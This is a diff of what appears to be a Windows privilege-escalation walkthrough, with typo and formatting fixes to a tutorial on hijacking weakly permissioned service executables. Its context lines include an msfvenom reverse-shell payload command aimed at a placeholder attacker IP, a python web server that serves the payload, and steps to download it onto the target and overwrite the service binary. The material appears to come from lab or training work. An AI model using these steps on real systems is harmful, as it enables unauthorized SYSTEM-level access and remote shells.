@@ -22,12 +22,12 @@ SERVICE_NAME: apphostsvc
         SERVICE_START_NAME : localSystem
 ```
 
-Here we can see that the associated executable is specified through the **BINARY_PATH_NAM** parameter, and the account used to run the service is shown on the **SERVICE_START_NAME** parameter
+Here we can see that the associated executable is specified through the **BINARY_PATH_NAME** parameter, and the account used to run the service is shown on the **SERVICE_START_NAME** parameter
 
 >Note:
->sc = Service Controller
->qc = Query Configure
->sc qc <Service_name>
+> - sc = Service Controller
+> - qc = Query Configure
+> - sc qc <Service_name>
 
 we are gonna check it with `sc` in example windows scheduler service
 
@@ -62,7 +62,7 @@ C:\PROGRAM\SYSTEM\WService.exe Everyone:(I)(M)
 Successfully processed 1 files; Failed processing 0 files
 ```
 
-in line 1 Everyone:(I)(M), (M) mean everyone in group has modify permission (M) on the service's executable, it mean i can simply overwrite it with any payload, and the service ill execute it with the privileges of the configured user account
+in line 1 `Everyone:(I)(M)`, (M) mean everyone in group has modify permission (M) on the service's executable, it mean i can simply overwrite it with any payload, and the service ill execute it with the privileges of the configured user account
 
 generate `exe-service` payload using `msfvenom` and serve it through a `python webserver`
 
@@ -73,7 +73,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=MY-IP LPORT=1337 -f exe-service 
 python3 -m http.server
 ```
 
-run wget in target machine with same python webserver port
+run `wget` in target machine with same python webserver port
 
 Once the payload is in the Windows server, replace the service executable with payload. Since i need another user to execute the payload, i'll want to grant full permissions to the Everyone group as well:
 
